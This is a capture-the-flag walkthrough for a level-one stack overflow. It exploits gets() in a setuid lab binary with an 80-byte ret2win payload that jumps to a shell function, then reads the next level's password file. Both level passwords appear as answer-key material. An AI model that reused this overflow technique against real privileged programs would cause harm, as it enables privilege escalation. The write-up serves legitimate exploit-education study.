# Level 01 — Walkthrough

---

## Overview

| | |
|---|---|
| **Binary** | `level1` |
| **User** | `level1` |
| **Goal user** | `level2` |
| **Protections** | *(no canary, no blocking NX at this level)* |
| **Password (current level)** | `1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a` |
| **Password (obtained)** | `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77` |

**Objective:** exploit the `level1` binary (setuid `level2`) so as to obtain a shell and read `/home/user/level2/.pass`.

---

## 1. Reconnaissance

Approximate reconstruction of the source:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void run(void)
{
    write(1, "Good... oh wait!\n", 17);
    execl("/bin/sh", "sh", NULL);
}

int main(void)
{
    char buff[76];

    gets(buff);
    return 0;
}
```

The binary reads user input into a fixed buffer, and contains — unused by the ordinary flow of execution — a function that spawns a shell.

---

## 2. Static Analysis

- A buffer of **76 bytes**.
- Use of `gets()` — a function admitting no bound upon the length it reads, and thus a buffer overflow becomes possible.
- Presence of a `run()` function, which writes a message and then executes `/bin/sh`.
- No canary, no filter, no obstruction of note at this level.

The program reads input without verifying its length; it therefore becomes possible to overwrite the return address of `main` and redirect execution toward `run`.

---

## 3. Dynamic Analysis

The address of `run` was located both by static means and by confirmation under the debugger:

```bash
objdump -d level1 | grep -A5 "<run>"
```

or, within GDB:

```gdb
disas run
```

yielding an address of the form `0x08048444` (to be verified against the actual binary in hand).

The offset separating the start of the buffer from the return address was computed thus:

- Buffer: 76 bytes
- Saved EBP: 4 bytes
- Return address: 4 bytes

— amounting to **80 bytes** of padding before the return address.

Verification under GDB:

```gdb
gdb ./level1
(gdb) b *main
(gdb) run < /tmp/payload
(gdb) disas run                  # confirm the address
(gdb) x/wx $ebp+4                # verify the return address was indeed overwritten
(gdb) c
```

---

## 4. Vulnerability

An unbounded `gets()` call upon a stack buffer, permitting the overwriting of the saved return address — a classical stack buffer overflow, unguarded by any canary.

---

## 5. Exploitation

**Strategy:** a return to an existing function within the binary itself (ret2text / ret2win) — namely `run`.

The payload is constructed as 80 bytes of padding, followed by the address of `run` in little-endian form:

```bash
python -c 'print "A"*80 + "\x44\x84\x04\x08"' > /tmp/payload
```

(the four trailing bytes to be replaced with the true address of `run`).

Its size was verified:

```bash
wc -c /tmp/payload
# should show 84
```

The payload was then delivered thus:

```bash
(cat /tmp/payload; cat) | ./level1
```

---

## 6. Result

Once the shell is obtained:

```bash
id
cat /home/user/level2/.pass
```

| Step | Description |
|------|-------------|
| 1 | Buffer overflow via `gets` |
| 2 | 80 bytes of padding to reach the return address |
| 3 | Overwrite the return address with the address of `run` |
| 4 | The program jumps into `run` — shell obtained |

---

## Notes & Lessons

This level illustrates the most elementary form of stack exploitation: redirecting execution toward code already present within the binary, without recourse to injected shellcode.
